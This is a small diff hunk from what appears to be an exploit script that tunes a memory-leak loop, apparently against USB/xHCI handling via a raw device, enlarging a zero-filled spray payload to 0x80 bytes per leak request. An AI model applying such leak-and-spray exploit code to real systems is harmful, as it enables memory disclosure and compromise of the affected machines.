@@ -148,7 +148,9 @@ def main():
     errs = {}
     n_ok = 0
     for i in range(args.leak - 1):
-        rc = cyc(fd_raw, spray_setup, b'\x00' * 0x40)
+        # sketch-exact leak class: serve the FULL 0x80 data phase, then
+        # hold (no status TRB) - the sketch reads 0x80 per leak request.
+        rc = cyc(fd_raw, spray_setup, b'\x00' * 0x80)
         if rc == 0:
             n_ok += 1
         else:
